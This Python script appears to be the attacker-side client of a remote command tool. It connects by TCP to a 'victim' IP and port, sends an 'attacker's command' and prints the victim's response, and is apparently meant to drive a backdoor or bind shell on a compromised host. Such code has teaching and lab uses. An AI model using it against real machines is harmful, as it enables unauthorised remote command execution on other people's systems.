import argparse
import sys
import socket
import ipaddress

IP = ""
PORT = 0
COMMAND = ""
BUFFER_SIZE = 1024

def parse_arguments():
    global IP, PORT, COMMAND
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", type=str, required=True, help="Victim\'s IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Victim\'s port")
    parser.add_argument("-c", "--command", type=str, required=True, help="Attacker\'s command")

    try:
        args = parser.parse_args()

    except SystemExit as e:
        parser.print_help()
        sys.exit()

    IP = args.ip
    PORT = args.port
    COMMAND = args.command

def handle_arguments():
    if PORT <= 0:
        print("Error: Port must be a positive integer. Try again.")
        sys.exit()

    if not ipaddress.ip_address(IP):
        print("Error: IP address must be a valid IP address. Try again.")
        sys.exit()

def create_socket():
    print("Attacker - Creating socket...")
    try:
        attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as e:
        print("Attacker - Error creating socket: {}".format(e))
        sys.exit()

    return attacker_socket

def connect_socket(attacker_socket):
    print("Attacker - Connecting to victim socket at {}:{}...".format(IP, PORT))
    try:
        attacker_socket.connect((IP, PORT))

    except socket.error as e:
        print("Attacker - Error connecting to victim: {}".format(e))
        attacker_socket.close()
        sys.exit()

def handle_request(attacker_socket):
    print("------------------------------------")
    print("Attacker - Command: {}".format(COMMAND))

    if len(COMMAND) > BUFFER_SIZE:
        print("Attacker - Command is longer than buffer size")
        attacker_socket.close()
        sys.exit()

    try:
        attacker_socket.send(bytes(COMMAND, encoding="utf-8"))

    except socket.error as e:
        print("Attacker - Error sending command: {}".format(e))
        attacker_socket.close()
        sys.exit()

    handle_victim_response(attacker_socket)

def handle_victim_response(attacker_socket):
    try:
        response = attacker_socket.recv(BUFFER_SIZE).decode("utf-8")

    except socket.error as e:
        print("Attacker - Error reading response: {}".format(e))
        attacker_socket.close()
        sys.exit()

    print("Attacker - Receiving victim response:\n{}".format(response))

if __name__ == "__main__":
    parse_arguments()
    handle_arguments()
    sock = create_socket()
    connect_socket(sock)
    handle_request(sock)

    print("Attacker - Closing socket")
    sock.close()
